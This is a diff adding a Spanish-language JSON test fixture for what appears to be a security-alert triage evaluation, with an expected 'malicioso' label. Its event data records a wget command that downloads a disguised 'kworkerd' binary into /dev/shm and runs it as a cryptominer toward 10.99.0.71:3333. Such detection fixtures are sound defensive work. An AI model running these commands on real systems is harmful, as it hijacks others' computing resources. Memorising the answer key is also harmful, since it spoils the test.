@@ -1,0 +1,20 @@
+{
+  "incidente_id": "EVAL-M03",
+  "host": "app-01",
+  "segmento": "servicios",
+  "alertas": [
+    {"alerta_id": "ALR-EVAL-M03-1", "regla_id": "R-T1105-descarga-desde-shell", "tecnica": "T1105", "severidad": "media",
+     "descripcion": "Descarga de un archivo desde un shell", "eventos": ["EVT-M03-1"]},
+    {"alerta_id": "ALR-EVAL-M03-2", "regla_id": "R-T1496-proceso-minero", "tecnica": "T1496", "severidad": "alta",
+     "descripcion": "Proceso con uso sostenido de CPU conectado a un puerto típico de minería", "eventos": ["EVT-M03-2", "EVT-M03-3"]}
+  ],
+  "eventos": [
+    {"evento_id": "EVT-M03-1", "ts": "2026-11-13T02:10:00Z", "host": "app-01", "tipo": "proceso",
+     "datos": {"padre": "sh", "proceso": "/usr/bin/wget", "usuario": "app", "cmdline": "wget -q http://10.99.0.70/kworkerd -O /dev/shm/kworkerd"}},
+    {"evento_id": "EVT-M03-2", "ts": "2026-11-13T02:10:05Z", "host": "app-01", "tipo": "proceso",
+     "datos": {"padre": "sh", "proceso": "/dev/shm/kworkerd", "usuario": "app", "cmdline": "/dev/shm/kworkerd -o 10.99.0.71:3333 --donate-level 0", "cpu_pct": 97}},
+    {"evento_id": "EVT-M03-3", "ts": "2026-11-13T02:10:06Z", "host": "app-01", "tipo": "conexion",
+     "datos": {"ip_origen": "10.20.0.12", "ip_destino": "10.99.0.71", "puerto_destino": 3333, "protocolo": "tcp"}}
+  ],
+  "etiqueta_esperada": "malicioso"
+}
